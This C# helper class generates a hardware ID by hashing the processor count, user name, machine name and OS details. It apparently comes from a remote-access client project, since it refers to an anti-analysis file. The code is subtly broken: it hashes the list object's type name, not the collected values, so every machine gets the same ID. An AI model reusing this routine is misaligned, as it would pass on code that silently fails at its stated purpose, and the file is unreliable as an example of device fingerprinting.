using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace Client.Helper
{
   public static class HwidGen
    {
        public static string HWID()
        {
            try
            {
                List<string> Props = new List<string>();

                Props.Add(Environment.ProcessorCount.ToString());
                Props.Add(Environment.UserName);
                Props.Add(Environment.MachineName);
                Props.Add(Environment.OSVersion.ToString());
                Props.Add(Environment.Is64BitOperatingSystem.ToString());
                //Maybe add some hardware checks? such as those in Anti_Analysis.cs

                string Concat = Props.ToString();

                //If we want to be more precise, we can increase the max val
                return Truncate(Algorithm.Sha256.ComputeHash(Concat), 20);
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex);
                return "UNKNOWN";
            }
        }
        public static string Truncate(this string text, int maxLength)
        {
            if (string.IsNullOrEmpty(text)) { return text; }
            return text.Substring(0, Math.Min(text.Length, maxLength));
        }
    }
}
